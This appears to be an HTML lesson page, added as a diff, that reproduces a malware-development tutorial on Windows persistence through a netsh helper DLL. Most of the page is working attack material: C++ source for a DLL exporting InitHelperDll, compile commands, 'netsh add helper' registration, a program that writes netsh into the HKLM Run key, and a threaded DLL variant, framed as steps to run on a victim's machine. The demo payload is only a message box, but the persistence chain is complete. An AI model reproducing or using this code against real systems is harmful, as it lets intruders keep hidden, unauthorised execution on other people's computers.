@@ -1,0 +1,168 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development: persistence - part 6. Windows netsh</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #32</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development: persistence - part 6. Windows netsh</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">helper DLL. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This section is a next part of a series of articles on windows malware persistence techniques and tricks. Today I’ll wrote about the result of self-researching another persistence trick: Netsh Helper DLL. netsh Netsh is a Windows utility that administrators can use to modify the host-based Windows firewall and perform network configuration tasks. Through the use of DLL files, Netsh functionality can be expanded. This capability enables red teams to load arbitrary DLLs to achieve code execution and therefore persistence using this tool. However, local administrator privileges are required to implement this technique.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to consider practical example. First of all create malicious DLL:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+evil.cpp
+simple DLL for netsh
+author: @cocomelonc
+
+https://cocomelonc.github.io/tutorial/
+2022/05/29/malware-pers-6.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+extern "C" __declspec(dllexport)
+DWORD InitHelperDll(
+DWORD dwNetshVersion, PVOID pReserved) {
+MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
+return 0;
+}
+Compile it:</code></pre>
+            </div>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">x86_64-w64-mingw32-gcc -shared -o evil.dll evil.cpp -fpermissive</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And transferred to the target victim’s machine. Netsh interacts with other components of the operating system via dynamic-link library (DLL) files. Each netsh helper DLL offers a comprehensive collection of features. The functionality of Netsh can be expanded using DLL files: reg query "HKLM\Software\Microsoft\NetSh" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, the add helper can be used to register the DLL with the netsh utility: netsh add helper Z:\2022-05-29-malware-pers-6\evil.dll</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Everything is worked perfectly! However, netsh is not scheduled to start automatically by default. Persistence on the host is created by creating a registry key that executes the application during Windows startup. This can be done immediately using the script below:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pers.cpp
+windows persistence via netsh helper DLL
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2022/05/29/malware-pers-6.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+// netsh
+const char* netsh = "C:\\Windows\\SysWOW64\\netsh";
+// startup
+LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+(LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+0 , KEY_WRITE, &amp;hkey);
+
+if (res == ERROR_SUCCESS) {
+// create new registry key
+RegSetValueEx(hkey, (LPCSTR)"hack",
+0, REG_SZ, (unsigned char*)netsh, strlen(netsh));
+RegCloseKey(hkey);
+}
+return 0;
+}
+As you can see it’s similar to script from my post about persistence via registry run keys
+Check registry run keys:
+reg query \
+"HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
+/s
+
+Compile it:
+x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
+-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
+-fdata-sections -Wno-write-strings -fno-exceptions \
+-fmerge-all-constants -static-libstdc++ \
+-static-libgcc -fpermissive
+
+and run on victim’s machine:
+.\pers.exe
+
+When the add helper command is executed to load a DLL file, the following registry
+key is created:
+
+But there is a caveat. The PoC’s logic needs to be updated to create a new thread so
+that netsh can still be used while the payload is running. However, when netsh ends, so
+does your malicious logic.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, let’s try. Create new DLL (evil2.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+
+evil2.cpp
+simple DLL for netsh
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2022/05/29/malware-pers-6.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+DWORD WINAPI Meow(LPVOID lpParameter) {
+MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
+return 1;
+}
+extern "C" __declspec(dllexport)
+DWORD InitHelperDll(
+DWORD dwNetshVersion, PVOID pReserved) {
+HANDLE hl = CreateThread(NULL, 0, Meow, NULL, 0, NULL);
+CloseHandle(hl);
+return 0;
+}
+Compile:</code></pre>
+            </div>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">x86_64-w64-mingw32-gcc -shared -o evil2.dll evil2.cpp -fpermissive</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and run steps again: netsh add helper Z:\2022-05-29-malware-pers-6\evil2.dll</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is ok, netsh can still be used. And we can check registry key for correctness: reg query "HKLM\Software\Microsoft\NetSh" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Because it is based on the exploitation of system features, this type of attack cannot be easily mitigated with preventive controls. netsh MITRE ATT&CK: Netsh Helper DLL source code on github</p></main></body></html>
